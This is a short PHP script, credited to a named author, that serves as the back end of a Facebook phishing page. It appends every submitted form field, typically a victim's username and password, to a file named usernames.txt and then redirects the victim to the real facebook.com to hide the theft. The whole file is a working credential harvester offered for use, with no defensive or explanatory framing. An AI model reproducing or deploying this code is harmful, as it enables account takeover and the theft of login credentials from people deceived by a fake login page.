/*
Do not edit anythings in this section

Credits
    ************************************************
    ** Coded by Libra David (TulaRam)             **
    ** Donate Paypal: tularamkathariya8@gmail.com **
    ** Mail : tularamkathariya8@gmail.com         **
    ** GitHub : https://github.com/libradavid     **
    ************************************************
*/

<?php
header ('Location:http://www.facebook.com/');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>